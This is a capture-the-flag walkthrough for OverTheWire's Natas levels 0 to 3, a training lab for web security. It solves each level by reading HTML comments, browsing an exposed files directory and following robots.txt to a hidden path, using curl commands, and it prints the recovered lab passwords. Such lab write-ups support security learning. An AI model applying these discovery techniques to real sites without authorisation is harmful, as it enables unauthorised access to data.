## Natas

> Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Start here:

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

## Natas Level 0

View Source.

```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

Credential : natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto

## Natas Level 1 → Level 2

Username: natas1
URL:      http://natas1.natas.labs.overthewire.org


```
view-source:http://natas1.natas.labs.overthewire.org/
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

Credential : natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

## Natas Level 2 → Level 3

```
http://natas2.natas.labs.overthewire.org/files/

$ curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

Credential : natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14


## Natas Level 3 → Level 4

`<!-- No more information leaks!! Not even Google will find it this time... -->`

```
$ curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/
$ curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

Credential : `natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`
